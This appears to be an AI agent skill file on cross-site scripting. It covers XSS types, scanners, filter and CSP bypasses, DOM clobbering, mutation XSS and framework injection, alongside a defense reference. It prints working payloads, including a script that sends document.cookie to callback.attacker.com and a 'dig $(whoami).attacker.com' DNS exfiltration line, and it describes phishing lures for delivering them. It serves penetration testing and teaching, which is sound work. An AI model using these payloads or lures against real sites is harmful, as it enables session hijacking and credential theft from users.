---
name: web-xss
description: "XSS (Cross-Site Scripting) is an attack that injects malicious scripts into trusted websites."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 5
  guide_count: 5
  owasp: "A03:2021-Injection"
  mitre: "T1189-Drive-by Compromise"
---




# Skill: Cross-Site Scripting (XSS)

> **Supplementary Files**:
> - `payloads.md` -- XSS attack payloads organized by category (probing, reflected, stored, DOM-based, encoding bypass, WAF bypass, blind, CSP bypass, cookie theft)
> - `test-cases.md` -- Structured test cases with severity levels, preconditions, and expected results (10 test cases covering 5 XSS categories)

## Summary

Web Xss skill domain covering web attack operations.

**Tools**: Burp Suite, Browser DevTools, XSStrike, Dalfox, Custom Payloads

**Domain**: web-attack

**OWASP**: A03:2021-Injection

**MITRE ATT&CK**: T1189-Drive-by Compromise

## Description

XSS (Cross-Site Scripting) is an attack that injects malicious scripts into trusted websites. The victim's browser executes the attacker-injected JavaScript because it trusts the target domain, leading to serious consequences such as session hijacking, credential theft, keylogging, and phishing scams. XSS has consistently ranked in the OWASP Top 10 and is one of the most common and impactful vulnerability types in web security.

**Four Core Types**:

- **Reflected XSS**: Malicious payloads are submitted through URL parameters or forms, and the server embeds the input as-is into the response HTML. The attack requires tricking the victim into clicking a specially crafted link. Commonly found in search boxes, error messages, and redirect pages.
- **Stored XSS**: Malicious payloads are persisted on the server (database, logs, comments), and any user visiting that page will trigger script execution. This is the most impactful type with the widest reach. Commonly found in comment sections, user nicknames, filenames, and messaging systems.
- **DOM-based XSS**: The entire attack flow occurs on the client side without server involvement. JavaScript reads data from sources like `location.hash`, `document.URL`, and `document.referrer` and writes it directly to the DOM. Commonly found in single-page applications (SPAs), front-end routing, and dynamic rendering.
- **Mutation XSS (mXSS)**: Exploits differences in how the browser HTML parser and sanitization libraries parse the same string, bypassing XSS filters like DOMPurify. When sanitized HTML is re-serialized and parsed by the browser, it may produce dangerous tags or attributes that were originally filtered.

**Advanced Bypass Dimensions**: WAF rule bypass, encoding obfuscation (HTML Entity / URL / Unicode / Base64), event handler alternatives, SVG/MathML injection, template literal injection, prototype pollution chains, CSS injection combinations.

---

## Use Cases

1. **Web Application Penetration Testing**: Systematically probe all user input points (URL parameters, forms, HTTP headers, cookies), verify XSS vulnerabilities, and assess impact scope.
2. **Bug Bounty Hunting**: Quickly locate XSS-exploitable points on large attack surfaces, construct high-value PoCs to demonstrate actual harm of session hijacking or data theft.
3. **Security Code Audit**: Review DOM operations in front-end code (`innerHTML`, `document.write`, `eval`) and back-end template rendering logic, identify unvalidated/unencoded output points.
4. **Red Team Social Engineering Attack Chain**: Combine phishing emails or social media to distribute links containing XSS payloads, steal session tokens from target internal systems, or execute browser exploit chains.
5. **CSP Policy Audit and Bypass**: Detect Content Security Policy configuration flaws, exploit insecure directives (e.g., `unsafe-inline`, `unsafe-eval`, permissive `script-src` domains) to bypass protection.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Burp Suite** | Proxy interception, active/passive scanning, payload encoding, Repeater manual testing | Proxy intercept request -> Send to Repeater -> Modify parameters to test XSS |
| **Browser DevTools** | DOM inspection, console debugging, network capture, Sources breakpoint debugging | Enter `document.cookie` in Console to verify accessibility; Elements to inspect DOM context |
| **XSStrike** | Automated XSS detection and payload generation, built-in WAF bypass | `python xsstrike.py -u "http://target.com/search?q=test" --crawl` |
| **Dalfox** | High-speed XSS scanner, supports parameter mining, blind detection, polymorphic payloads | `dalfox url "http://target.com/page" -b https://your-callback.oastify.com` |
| **Custom Payloads** | Hand-crafted payload collection for specific filtering rules | See `payloads.md` for complete list |

Auxiliary tools: **DOMPurify** (defense-side testing), **Hack-Bar** (browser quick encoding/sending), **Cookie Editor** (verify cookie attributes), **xnlink** (blind callback server), **ngrok** (external callback tunnel).

---

## Methodology

### Attack Chain

```
[1] Input Point          [2] Payload Testing       [3] Filter Bypass
    Discovery               - Basic probing            - Encoding obfuscation
  - URL parameters          - Context analysis          - Tag/attribute alternatives
  - Form fields             - Response tracing          - WAF fingerprinting
  - HTTP headers            - Render verification       - Mutation exploitation
  - Cookie / LocalStorage        |                        |
       |                        v                        v
       v                   [4] Exploitation           [5] Post-Exploitation
                             - Cookie theft             - Session hijacking
                             - Keylogger injection      - Phishing page overlay
                             - Page defacement/phishing - Lateral movement (via browser)
                             - CSRF + XSS combination   - Data exfiltration
```

**Key Principle**: Every XSS test must confirm three elements -- (1) input is controllable, (2) output is unencoded, and (3) the browser executes it.

### Defense Perspective

| Defense Layer | Measures | Key Points |
|---------------|----------|------------|
| **Output Encoding** | HTML entity encoding, JavaScript encoding, URL encoding, CSS encoding | Choose the appropriate encoding method based on output context; no one-size-fits-all |
| **Content Security Policy** | `script-src 'self'`; prohibit `unsafe-inline` / `unsafe-eval` | CSP is the last line of defense; see `guides/security_misconfiguration_complete_guide.md` |
| **Cookie Protection** | `HttpOnly` + `Secure` + `SameSite=Strict` | Prevent JavaScript from reading session cookies; see `guides/authentication_failures_complete_guide.md` |
| **Input Validation** | Allowlist validation, length limits, character filtering | Input validation is the first line of defense but cannot replace output encoding |
| **Framework Built-in Protection** | React JSX auto-escaping, Vue `v-text`, Angular auto-sanitization | Understand framework default behaviors and bypass methods (`dangerouslySetInnerHTML`, `v-html`) |
| **DOMPurify** | Server-side and client-side HTML sanitization | Be aware of mXSS attack surface; keep the library version updated |

---

## Practical Steps

### 1. Reflected XSS
Inject scripts into URL parameters where the server embeds the input as-is into the response. First probe with `<script>` tags; if filtered, switch to event handlers (`onerror`, `onload`, `onfocus`). Analyze the context of the input within the response (between HTML tags, inside attribute values, inside JavaScript variables) and choose the corresponding escape strategy.

### 2. Stored XSS
Persist malicious payloads on the server (user nicknames, comments, filenames, HTTP headers) — all users accessing that data will trigger execution. Prioritize testing header fields echoed in admin panels (User-Agent, Referer) and user-visible fields (comments, nicknames).

### 3. DOM-based XSS
The entire attack occurs on the client side; the payload does not pass through the server. Focus on auditing dangerous sinks like `innerHTML`, `document.write`, and jQuery `.html()`, combined with sources like `location.hash`, `document.URL`, and `window.name` to construct exploitation chains.

### 4. WAF Bypass
Bypass WAF rules through encoding obfuscation (HTML Entity, URL, Unicode, Base64), mixed casing, double encoding, null byte injection, newline/tab interference, and SVG/MathML injection techniques. Use string concatenation (`window['al'+'ert']`) for keyword detection bypass.

### 5. Blind XSS
Inject payloads with external callbacks in locations where responses cannot be directly seen (admin management systems, log analysis platforms, internal tools), and use XSStrike blind mode or Dalfox with a callback server to verify execution.

### 6. Session Hijacking PoC
Construct post-exploitation payloads for cookie theft, keylogging, and page content exfiltration to demonstrate the actual impact of XSS vulnerabilities. Use the `new Image().src` technique to bypass CORS restrictions for data exfiltration.

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.**

---

## Hacker Laws

- **Trust but Verify**: Browsers trust all scripts under the target domain. XSS fundamentally exploits the browser's unconditional trust in same-origin content. Security engineers must verify that every output point is properly encoded.
- **Obscurity Is Not Security**: Relying on WAF rules, keyword blacklists, or input length limits to defend against XSS is fragile. Attackers can easily bypass surface-level protections through encoding obfuscation, Mutation XSS, and protocol features. The only reliable approach is structured output encoding + CSP.
- **The Weakest Link Is Human**: Reflected XSS and Blind XSS both require tricking victims into clicking malicious links or triggering malicious input echo. Social engineering and phishing are key amplifiers in the XSS attack chain. Beyond technical defenses, security awareness training is equally important.

---

## XSS Payload Delivery and Social Engineering

Even the most sophisticated XSS payload is useless without a delivery mechanism that reaches the victim's browser. This section covers the delivery vectors and social engineering techniques that make XSS attacks successful in real-world engagements.

**Delivery Vectors**:

| Vector | XSS Type | Typical Scenario |
|--------|----------|-----------------|
| Crafted URL (email/chat) | Reflected | Phishing email with link containing payload in query parameter |
| Malicious comment/post | Stored | Forum, blog, or social media post with embedded payload |
| Compromised third-party script | Supply Chain | Ad networks, analytics scripts, CDN-hosted libraries |
| Shortened URLs | Reflected | URL shorteners hide the payload from visual inspection |
| QR code | Reflected | Physical-world delivery: posters, business cards, printed materials |
| WiFi captive portal | Stored/DOM | Rogue access point injecting scripts into login page |
| Malicious browser extension | DOM | Extension content scripts interacting with target page |

**Social Engineering Amplifiers**: Reflected XSS requires victim interaction. The click-through rate depends on context credibility. The most effective lures combine urgency ("Your account will be suspended"), authority ("Internal IT portal update"), and familiarity (matching corporate branding). Shortened URLs and QR codes reduce visual suspicion.

**Key Principle**: During penetration testing, always demonstrate the full attack chain including the delivery mechanism, not just the payload. Stakeholders understand risk better when they see how an attacker would actually reach their users.

---

## Blind XSS and Callback Techniques

Blind XSS occurs when the injected payload executes in a context the attacker cannot directly observe -- typically in an admin panel, internal dashboard, log viewer, or support ticket system. The attacker injects a payload with an external callback mechanism and waits for the payload to fire when an authorized user views the affected page.

**Callback Mechanisms**:

| Mechanism | Command | Use Case |
|-----------|---------|----------|
| XSS Hunter | `xsshunter.com` integration | Automated blind XSS detection with screenshots |
| Interactsh | `interactsh-client` | Self-hosted OOB callback server |
| Burp Collaborator | Built into Burp Suite | Integrated with Burp testing workflow |
| Custom webhook | `https://webhook.site` | Quick ad-hoc callback testing |
| DNS exfiltration | `dig $(whoami).attacker.com` | When HTTP callbacks are blocked |

**High-Value Blind XSS Injection Points**:
- User-Agent, Referer, X-Forwarded-For headers (echoed in admin analytics)
- Support ticket fields (viewed by staff in internal systems)
- User profile fields (viewed by admins during moderation)
- File metadata (EXIF data, filenames in upload forms)
- API logs and error tracking systems (Sentry, Datadog)

**Payload Pattern**: `<script>fetch('https://callback.attacker.com/xss?c='+document.cookie+'&l='+location.href)</script>`

> **For detailed escalation techniques see `guides/xss-to-rce-escalation-guide.md`.**

---

## XSS Filter Evasion

XSS filter evasion is the art of crafting payloads that bypass sanitization libraries, browser built-in XSS auditors, and custom input filters. Modern web applications deploy multiple layers of defense, but each layer introduces parser inconsistencies that attackers can exploit.

**Core Evasion Strategies**:

| Strategy | Technique | Example |
|----------|-----------|---------|
| Encoding obfuscation | HTML Entity, URL, Unicode, Base64 | `&#x61;lert(1)` |
| Case manipulation | Mixed-case tag/attribute names | `<ScRiPt>alert(1)</ScRiPt>` |
| Null byte injection | Break parser logic with `%00` | `<scr%00ipt>alert(1)</script>` |
| Whitespace tricks | Tab, newline, carriage return | `<img src=x onerror="al\tfert(1)">` |
| Tag alternatives | Lesser-known event handlers | `<details open ontoggle=alert(1)>` |
| SVG/MathML nesting | Abuse namespace parsing | `<svg><animate onbegin=alert(1)>` |

**Key Principle**: Every filter operates on a specific parser. When the filter's parser and the browser's parser disagree on how to interpret the same string, evasion is possible. The goal is to construct a string that the filter considers safe but the browser executes as code.

> **For detailed evasion payloads see `guides/xss-filter-evasion-guide.md` and `payloads.md`.**

---

## Content Security Policy Bypass

Content Security Policy (CSP) is a browser-enforced defense that restricts which scripts a page can execute. However, misconfigured CSP policies are common and can be systematically bypassed.

**Common CSP Weaknesses**:

| Misconfiguration | Bypass Technique |
|------------------|-----------------|
| `unsafe-inline` in `script-src` | Direct inline script injection |
| `unsafe-eval` in `script-src` | `eval()`, `Function()`, `setTimeout(string)` |
| Whitelisted CDN domains | Load malicious JS from allowed CDN or use JSONP endpoints |
| Missing `base-uri` restriction | `<base>` tag hijacking to redirect script loads |
| Missing `object-src` restriction | `<object>` / `<embed>` tag injection |
| Permissive `script-src` with Angular | Angular template injection via `ng-app` + `{{$eval.constructor('alert(1)')()}}` |
| `strict-dynamic` with pre-existing script | Leverage script gadgets in trusted JS to load attacker code |

**CSP Bypass Workflow**:
1. Extract CSP header: `curl -sI https://target.com | grep -i content-security-policy`
2. Analyze with Google CSP Evaluator or `csp-evaluator` tool
3. Identify allowed script sources and JSONP endpoints
4. Construct payload using the weakest allowed directive

> **For comprehensive CSP bypass techniques see `guides/csp-bypass-techniques-guide.md`.**

---

## DOM Clobbering

DOM Clobbering is an advanced technique that exploits the browser's named property lookup on the `window` and `document` objects. By injecting HTML elements with specific `id` or `name` attributes, attackers can overwrite or shadow JavaScript variables and DOM references.

**How It Works**: When a browser encounters `<form id="config">` or `<img name="isAdmin">`, these elements become accessible as `window.config` and `window.isAdmin`. If the application's JavaScript references global variables with the same names, the injected HTML elements take precedence.

**Common Attack Patterns**:

```html
<!-- Overwrite a global configuration object -->
<form id="config"><input name="apiEndpoint" value="https://evil.com/api"></form>
<!-- Now window.config.apiEndpoint === "https://evil.com/api" -->

<!-- Shadow a boolean check -->
<img name="isAdmin" src=x>
<!-- Now window.isAdmin is an HTMLImageElement (truthy) -->

<!-- Clobber document methods via named forms -->
<form name="cookie"><input name="toString" value="session=stolen"></form>
```

**Impact**: DOM Clobbering can bypass sanitization logic, redirect API calls to attacker-controlled endpoints, disable security checks, and escalate to full XSS when combined with other vulnerabilities like prototype pollution.

---

## Mutation XSS (mXSS)

Mutation XSS exploits differences between how sanitization libraries parse HTML and how the browser actually parses it during DOM insertion. When sanitized HTML is inserted into the DOM via `innerHTML` and then read back via `innerHTML` getter, the browser may "mutate" the HTML into a form that the sanitizer did not anticipate.

**Root Cause**: HTML parsing is not a reversible operation. The serialization step (reading `innerHTML`) can produce different output than the original input because the browser's parser applies error correction, namespace changes, and element reorganization rules.

**Classic mXSS Vectors**:

```html
<!-- SVG namespace confusion (DOMPurify < 2.0.16) -->
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">

<!-- MathML namespace with SVG nesting -->
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">

<!-- Backtick inside SVG style -->
<svg><style>*{background:url(``</style><img onerror=alert(1) src=x>)</svg>
```

**Defense**: Use DOMPurify with `FORCE_BODY` option, keep the library updated (mXSS bypasses are discovered regularly), and avoid `innerHTML` entirely when `textContent` suffices.

> **For mXSS research references see the Learning Resources section and `guides/xss-filter-evasion-guide.md`.**

---

## XSS in Modern Frameworks

Modern JavaScript frameworks (React, Vue, Angular) provide built-in XSS protections through automatic escaping and context-aware encoding. However, developers can bypass these protections using framework-specific escape hatches, and each framework has unique XSS attack surfaces.

**Framework-Specific XSS Vectors**:

| Framework | Safe by Default | Escape Hatch | XSS Vector |
|-----------|----------------|--------------|------------|
| React | Yes (JSX auto-escapes) | `dangerouslySetInnerHTML` | `__html: userInput` |
| Vue | Yes (`{{ }}` / `v-text`) | `v-html` | `<div v-html="userInput">` |
| Angular | Yes (auto-sanitization) | `bypassSecurityTrust*` methods | `DomSanitizer.bypassSecurityTrustHtml(userInput)` |
| Svelte | Yes (`{}` auto-escapes) | `{@html}` | `{@html userInput}` |
| Next.js | Yes (React-based) | `dangerouslySetInnerHTML` + SSR | SSR template injection |

**Template Injection**: Beyond direct HTML injection, many frameworks support template expressions that can be exploited when user input flows into template compilation:

```javascript
// Angular template injection (when ng-app is present)
{{$eval.constructor('alert(1)')()}}

// Vue template injection (when dynamic template compilation is used)
{{constructor.constructor('alert(1)')()}}

// React JSX injection via dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
```

**Key Takeaway**: Never assume a framework's built-in protection is sufficient. Always audit code for escape hatches (`v-html`, `dangerouslySetInnerHTML`, `{@html}`), server-side template injection, and stored XSS through API endpoints that bypass client-side sanitization.

## XSS Impact Classification

| Impact Level | Capability | Example Attack |
|-------------|-----------|----------------|
| Low | Page defacement, alert boxes | `<script>alert(1)</script>` |
| Medium | Session hijacking, credential theft | Cookie stealing via document.cookie |
| High | Keylogging, phishing, crypto mining | Keyboard event capture scripts |
| Critical | RCE (via Electron/Node), worm propagation | Samy worm, XSS-to-RCE chains |

## XSS Defense Quick Reference

| Defense | Mechanism | Bypass Potential |
|---------|-----------|-----------------|
| Content Security Policy | Restricts script sources | JSONP, script gadgets, strict-dynamic |
| HTTPOnly Cookies | Prevents JS access to cookies | Session fixation, token theft via other means |
| Input Validation | Rejects malicious input | Encoding bypass, double encoding |
| Output Encoding | Escapes special characters | Context mismatch, DOM-based XSS |
| WAF | Pattern-based blocking | Obfuscation, encoding, fragmentation |

---

## Learning Resources

  **Supplementary files for this skill**: payloads.md, test-cases.md
  **Related skills**: skills/web-sqli/SKILL.md, skills/web-auth-bypass/SKILL.md
  **External resources**:
- **PortSwigger Web Security Academy - XSS**: https://portswigger.net/web-security/cross-site-scripting (Systematic labs, from basic to advanced)
- **OWASP XSS Filter Evasion Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html (Comprehensive bypass techniques)
- **PortSwigger XSS Labs**: https://portswigger.net/web-security/all-labs (Includes DOM XSS, CSP Bypass, Mutation XSS topics)
- **OWASP Juice Shop**: https://owasp.org/www-project-juice-shop/ (Includes dozens of XSS challenges at different difficulty levels)
- **Mario Heiderich - mXSS Research**: https://research.securitum.com/ (Cutting-edge Mutation XSS research)
- **HTML5 Security CheatSheet**: https://html5sec.org/ (HTML5-related XSS vector collection)

**Workspace related documents**:
- `plans/web_security_advanced_plan.md` -- XSS advanced techniques learning module
- `guides/security_misconfiguration_complete_guide.md` -- CSP and security header configuration
- `guides/authentication_failures_complete_guide.md` -- Session hijacking and cookie security
